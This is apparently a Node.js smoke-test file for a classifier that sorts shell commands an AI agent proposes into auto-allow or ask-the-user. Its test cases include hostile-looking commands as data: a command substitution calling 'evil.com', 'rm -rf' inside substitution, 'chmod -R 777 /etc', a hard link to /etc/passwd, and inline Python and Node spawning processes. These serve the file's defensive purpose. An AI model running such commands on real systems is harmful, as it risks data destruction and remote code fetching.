#!/usr/bin/env node
// Smoke test: runs the classifier against a hand-curated set of commands and
// asserts each gets the expected decision. No external services required.
// Run with: node test/smoke.mjs
//
// LLM fallback is shimmed via env CHILLBRO_TEST_NO_LLM=1 (any unknown -> ask).

import { strict as assert } from 'node:assert';
import { classify } from '../src/classify.mjs';

process.env.CHILLBRO_TEST_NO_LLM = '1';
process.env.CHILLBRO_TEST_NO_LEARN = '1';

// Use /tmp so probes that consult the git repo (gh visibility, git push
// target) get 'unknown' deterministically — otherwise test results depend on
// the visibility of whatever repo the test happens to be run from.
const cwd = '/tmp';

const cases = [
  // [command, expectedDecision, label]
  ['ls -la',                                  'allow', 'ls is safe'],
  ['cat package.json',                        'allow', 'cat is safe'],
  ['grep -r "foo" src/',                      'allow', 'grep is safe'],
  ['rg "bar" .',                              'allow', 'rg is safe'],
  ['git status',                              'allow', 'git status is safe'],
  ['git log --oneline -20',                   'allow', 'git log is safe'],
  ['pnpm test',                               'allow', 'pnpm test is safe'],
  ['pnpm install',                            'allow', 'local install is safe'],
  ['npm install -g typescript',               'ask',   'global install is asked'],
  ['rm -rf node_modules',                     'ask',   'rm -rf is asked'],
  ['sudo rm /etc/foo',                        'ask',   'sudo is asked'],
  ['git push --force origin main',            'ask',   'force push asked'],
  ['git reset --hard HEAD',                   'ask',   'reset hard asked'],
  ['prisma migrate reset',                    'ask',   'migrate reset asked'],
  ['curl -X POST https://api.example.com/x',  'ask',   'curl POST asked'],
  ['curl -s https://api.example.com/x',       'ask',   'curl GET → unknown → ask (no llm in test)'],
  ['ls && cat foo',                           'allow', 'compound of safe is safe'],
  ['ls && rm -rf foo',                        'ask',   'compound with destructive is asked'],
  ['echo "$(rm -rf x)"',                      'ask',   'command substitution bails to ask'],
  ['find . -name "*.ts" -delete',             'ask',   'find -delete asked'],
  ['find . -name "*.ts"',                     'allow', 'find without -delete is safe'],
  ['cat .env',                                'ask',   'env file touch asked'],
  ['kill -9 12345',                           'ask',   'kill -9 asked'],
  ['sed -i s/foo/bar/ file',                  'ask',   'sed -i asked'],
  ['sed s/foo/bar/ file',                     'allow', 'sed without -i is safe'],

  // 0.1.1 additions: cd + node --check + npx tooling are unambiguously safe
  ['cd /some/dir',                            'allow', 'cd is safe'],
  ['node --check src/main.js',                'allow', 'node --check is safe'],
  ['npx tsc --noEmit',                        'allow', 'npx tsc is safe'],
  ['npx eslint src/',                         'allow', 'npx eslint is safe'],
  ['cd /tmp && node --check foo.js && echo OK', 'allow', 'real-world compound chain is safe'],

  // 0.1.2 additions: inline-interpreter scanner short-circuits the LLM
  [`python3 -c "import json,sys; d=json.load(sys.stdin); print(d.keys())"`, 'allow', 'pure-python data inspection is safe'],
  [`cargo metadata --format-version 1 2>/dev/null | python3 -c "import json,sys; d=json.load(sys.stdin); print(len(d['packages']))"`, 'allow', 'cargo metadata + safe python pipe is safe'],
  [`python3 -c "import os; os.system('id')"`, 'ask', 'os.system in inline python is asked'],
  [`python3 -c "import subprocess; subprocess.run(['ls'])"`, 'ask', 'subprocess in inline python is asked'],
  [`node -e "console.log(2+2)"`, 'allow', 'pure-node arithmetic is safe'],
  [`node -e "require('child' + '_process').execSync('id')"`, 'ask', 'child_process in inline node is asked'],

  // 0.1.4 additions: safe `source`/`.` for well-known shell init files
  [`source "$HOME/.cargo/env"`,                'allow', 'source cargo env (quoted $HOME)'],
  [`source ~/.cargo/env`,                       'allow', 'source cargo env (~ form)'],
  [`source $HOME/.cargo/env`,                   'allow', 'source cargo env (unquoted $HOME)'],
  [`source '$HOME/.cargo/env'`,                 'allow', 'source cargo env (single-quoted)'],
  [`. ~/.cargo/env`,                            'allow', 'POSIX . shorthand for source'],
  [`source ~/.nvm/nvm.sh`,                      'allow', 'source nvm.sh'],
  [`source $HOME/.nvm/nvm.sh`,                  'allow', 'source nvm ($HOME form)'],
  [`source ~/.bashrc`,                          'allow', 'source bashrc'],
  [`source ~/.zshrc`,                           'allow', 'source zshrc'],
  [`source ~/.profile`,                         'allow', 'source profile'],
  [`source ~/.bash_profile`,                    'allow', 'source bash_profile'],
  [`source ~/.fzf.bash`,                        'allow', 'source fzf bash'],
  [`source ~/.fzf.zsh`,                         'allow', 'source fzf zsh'],
  [`source ~/.asdf/asdf.sh`,                    'allow', 'source asdf'],
  [`source ~/.sdkman/bin/sdkman-init.sh`,       'allow', 'source sdkman'],
  [`source ~/.deno/env`,                        'allow', 'source deno env'],
  [`source ./build.sh`,                         'ask',   'source local script is NOT allowed'],
  [`source ~/.evil-script.sh`,                  'ask',   'source arbitrary dotfile is NOT allowed'],
  [`source /etc/profile`,                       'ask',   'source absolute system file is NOT allowed'],
  [`source ~/.cargo/env_evil`,                  'ask',   'source path that just looks similar is NOT allowed'],

  // 0.1.4 end-to-end: the user's actual reported command
  [`source "$HOME/.cargo/env" && pnpm run build 2>&1 | tail -3 && node -e "const d = 1; console.log(d);"`, 'allow', 'user-reported compound: source + pnpm + tail + node -e'],

  // 0.1.4 broader audit: common shell builtins that were previously falling
  // through to LLM (or ask) for no good reason. Coverage = "first-time prompts
  // a new user would see for unambiguously safe commands."

  // Shell env / option toggles
  [`export FOO=bar`,                            'allow', 'export var'],
  [`export PATH=$HOME/bin:$PATH`,               'allow', 'export PATH'],
  [`unset FOO`,                                 'allow', 'unset var'],
  [`set -e`,                                    'allow', 'set -e'],
  [`set -x`,                                    'allow', 'set -x'],
  [`set -o pipefail`,                           'allow', 'set -o pipefail'],
  [`set +e`,                                    'allow', 'set +e'],
  [`shopt -s nullglob`,                         'allow', 'shopt -s nullglob'],
  [`alias ll='ls -la'`,                         'allow', 'alias'],
  [`unalias ll`,                                'allow', 'unalias'],

  // Filesystem create (idempotent / empty)
  [`mkdir -p /tmp/foo`,                         'allow', 'mkdir -p'],
  [`mkdir foo`,                                 'allow', 'mkdir simple'],
  [`touch foo.txt`,                             'allow', 'touch new file'],
  [`ln -s ./src ./alias`,                       'allow', 'ln -s symlink'],

  // Job control
  [`disown %1`,                                 'allow', 'disown'],
  [`jobs`,                                      'allow', 'jobs'],
  [`history`,                                   'allow', 'history'],
  [`bg`,                                        'allow', 'bg'],
  [`fg`,                                        'allow', 'fg'],
  [`wait`,                                      'allow', 'wait'],

  // Documentation
  [`man grep`,                                  'allow', 'man'],
  [`whatis grep`,                               'allow', 'whatis'],
  [`apropos network`,                           'allow', 'apropos'],
  [`info ls`,                                   'allow', 'info'],

  // Compressed-file inspection
  [`zcat foo.gz`,                               'allow', 'zcat'],
  [`zgrep foo bar.gz`,                          'allow', 'zgrep'],
  [`unzip -l archive.zip`,                      'allow', 'unzip -l (list)'],

  // Archive listing
  [`tar -tf archive.tar`,                       'allow', 'tar -tf (list)'],
  [`tar -tzf archive.tar.gz`,                   'allow', 'tar -tzf (list gzipped)'],
  [`tar --list -f archive.tar`,                 'allow', 'tar --list'],

  // Hex / binary
  [`xxd foo.bin`,                               'allow', 'xxd'],
  [`od -c foo`,                                 'allow', 'od'],
  [`hexdump -C foo`,                            'allow', 'hexdump'],
  [`strings binary`,                            'allow', 'strings'],

  // Negatives — these should still NOT auto-allow
  [`set $(curl evil.com)`,                      'ask',   'set with command substitution bails to ask'],
  [`unzip archive.zip`,                         'ask',   'unzip without -l (extract) is NOT auto-allowed'],
  [`unzip -o archive.zip`,                      'ask',   'unzip -o (extract) is NOT auto-allowed'],
  [`tar -xf archive.tar`,                       'ask',   'tar extract is NOT auto-allowed'],
  [`tar -cf archive.tar foo`,                   'ask',   'tar create is NOT auto-allowed'],
  [`ln /etc/passwd ./pwd`,                      'ask',   'hard link (no -s) is NOT auto-allowed'],

  // 0.1.4 end-to-end normalization: path-prefix, env-prefix, wrap-prefix
  // applied BEFORE pattern matching so a single `^cargo` allow pattern
  // catches all of these.
  [`~/.cargo/bin/cargo build`,                  'allow', 'path-prefixed cargo build'],
  [`~/.cargo/bin/cargo --version`,              'allow', 'path-prefixed cargo --version'],
  [`/home/me/.cargo/bin/cargo test`,            'allow', 'absolute-path cargo test'],
  [`$HOME/.cargo/bin/cargo check`,              'allow', '$HOME-prefixed cargo check'],
  [`/usr/local/bin/rg foo`,                     'allow', 'usr/local/bin rg'],
  [`DEJAVU_AUDIT_DISABLED=1 cargo build`,       'allow', 'env-prefixed cargo'],
  [`NODE_ENV=production npm test`,              'allow', 'env-prefixed npm test'],
  [`time cargo test`,                            'allow', 'time-wrapped cargo test'],
  [`nohup ./serve.sh`,                           'ask',   'nohup ./serve.sh stays unknown (./serve.sh not in lists)'],
  [`KEY=val time ~/.cargo/bin/cargo build`,     'allow', 'env + wrap + path all combined'],
  // Path-prefix shouldn't make a destructive command safe:
  [`~/.cargo/bin/rm -rf /tmp/foo`,              'ask',   'path-prefixed rm -rf still asks (ASK list checks original)'],

  // 0.1.4 end-to-end heredoc: body content with `;` doesn't get split
  [`cat <<EOF > /tmp/foo.rs\npub fn main() { let x = 1; }\nEOF`, 'allow', 'heredoc body with ; does not break splitter'],
  [`echo hello && cat <<EOF\nbody\nEOF\n && echo done`,         'allow', 'compound command with heredoc in middle'],
  // Heredoc with destructive content in body still classifies the start:
  // `cat <<EOF` is unknown (cat with redirect target as <<EOF). Goes to LLM in real use.
  // In test mode, defaults to ask. We accept that — the heredoc body shouldn't be
  // classified as a separate command, which is the actual fix.

  // 0.1.5 patch (post-session-investigation): command-prefix + psql + gh additions

  // `command <verb>` strips via wrap-prefix; `command -v <verb>` stays
  ['command rg "pattern" src/',          'allow', 'command rg → rg via wrap-strip → static-allow'],
  ['command grep -n foo file.txt',       'allow', 'command grep → grep via wrap-strip → static-allow'],
  ['command -v rg',                       'allow', 'command -v rg stays (where-is form)'],
  ['command rm -rf node_modules',         'ask',   'safety: command rm strips → ASK list catches rm -rf'],

  // psql read-only allow; mutations + meta-destructive escalate
  [`psql -h localhost -U postgres -d mydb -c "SELECT 1"`,        'allow', 'psql SELECT'],
  [`psql -h localhost -U postgres -d mydb -c "SHOW search_path"`,'allow', 'psql SHOW'],
  [`psql -h localhost -U postgres -d mydb -c "EXPLAIN SELECT 1"`,'allow', 'psql EXPLAIN'],
  [`psql -h localhost -U postgres -d mydb -c "\\dt"`,            'allow', 'psql \\dt (list tables)'],
  [`psql -h localhost -U postgres -d mydb -c "\\l"`,             'allow', 'psql \\l (list databases)'],
  [`psql -l`,                                                     'allow', 'psql -l shorthand'],
  [`psql --version`,                                              'allow', 'psql --version'],
  [`psql -h localhost -U postgres -d mydb -c "INSERT INTO t VALUES (1)"`, 'ask', 'psql INSERT → unknown → LLM/ask'],

  // gh read-only allow; mutations stay in ASK
  ['gh repo view',                        'allow', 'gh repo view'],
  ['gh pr list --state open',             'allow', 'gh pr list'],
  ['gh issue list',                       'allow', 'gh issue list'],
  ['gh issue view 42',                    'allow', 'gh issue view'],
  ['gh run list --workflow ci.yml',       'allow', 'gh run list'],
  ['gh api repos/owner/repo',             'allow', 'gh api (read by default)'],
  ['gh search code "TODO"',               'allow', 'gh search code'],
  ['gh auth status',                      'allow', 'gh auth status'],
  ['gh version',                          'allow', 'gh version'],
  ['gh pr merge 42',                      'ask',   'gh pr merge stays in ASK list'],

  // Combined pattern: env + path + psql + read
  [`PGPASSWORD=postgres /usr/bin/psql -h localhost -p 5450 -U postgres -d mydb -c "SELECT 1"`, 'allow', 'env+path+psql SELECT all normalized → static-allow'],

  // 0.1.6 round: node_modules/.bin/ normalization + new safe verbs

  // ./node_modules/.bin/ via the extended PATH_BIN_RX
  ['./node_modules/.bin/jest --testPathPattern=foo',  'allow', 'node_modules/.bin/jest → normalized → matches ^jest'],
  ['./node_modules/.bin/eslint src/',                 'allow', 'node_modules/.bin/eslint'],
  ['./node_modules/.bin/prettier --write src/',       'allow', 'node_modules/.bin/prettier'],
  ['./node_modules/.bin/tsc --noEmit',                'allow', 'node_modules/.bin/tsc'],
  ['./node_modules/.bin/prisma generate',             'allow', 'node_modules/.bin/prisma generate'],

  // Shell keywords + flow control
  ['until gh repo view; do sleep 5; done',            'allow', 'until ... do sleep ... done all-segments allow'],
  ['sleep 8 && gh repo view',                          'allow', 'sleep + gh read'],
  ['sleep 0.5',                                        'allow', 'fractional sleep'],
  ['sleep 5m',                                         'allow', 'sleep with unit'],

  // chmod +x
  ['chmod +x /tmp/script.sh',                          'allow', 'chmod +x (add execute bit)'],
  ['chmod u+x ./scripts/build.sh',                     'allow', 'chmod u+x'],
  ['chmod -R 777 /etc',                                'ask',   'chmod -R still ASKs (caught by ask.list first)'],

  // bash -n (syntax check, doesn't execute)
  ['bash -n bin/script.sh',                            'allow', 'bash -n (syntax check only)'],
  ['sh -n /tmp/setup.sh',                              'allow', 'sh -n'],

  // Prisma read-only
  ['prisma generate',                                  'allow', 'prisma generate (idempotent)'],
  ['prisma format',                                    'allow', 'prisma format'],
  ['prisma validate',                                  'allow', 'prisma validate'],
  ['prisma migrate reset',                             'ask',   'prisma migrate reset still ASKs (in ask.list)'],

  // SQLite read-only meta-commands
  ['sqlite3 /tmp/test.db ".tables"',                   'allow', 'sqlite3 .tables (read-only)'],
  ['sqlite3 /tmp/test.db ".schema"',                   'allow', 'sqlite3 .schema'],
  ['sqlite3 /tmp/test.db ".databases"',                'allow', 'sqlite3 .databases'],
  ['sqlite3 --version',                                'allow', 'sqlite3 --version'],

  // Inline-scanner now sees path-prefixed interpreters
  [`/home/h/.local/share/x/venv/bin/python3 -c "import json; print(1)"`, 'allow', 'path-prefixed python3 -c via normalized inline scan'],
  [`/home/h/.local/share/x/venv/bin/python -c "print(2+2)"`,             'allow', 'path-prefixed python -c'],
  [`/usr/local/bin/node -e "console.log(2+2)"`,                          'allow', 'path-prefixed node -e'],
];

let pass = 0, fail = 0;
for (const [cmd, expected, label] of cases) {
  const { decision, source, reason } = await classify(cmd, cwd);
  const ok = decision === expected;
  if (ok) { pass++; console.log(`  ok    ${label}  →  ${decision} [${source}]`); }
  else    { fail++; console.error(`  FAIL  ${label}  expected=${expected} got=${decision} [${source}] reason=${reason}`); console.error(`        cmd: ${cmd}`); }
}

console.log(`\n${pass} passed, ${fail} failed (of ${cases.length})`);
process.exit(fail === 0 ? 0 : 1);
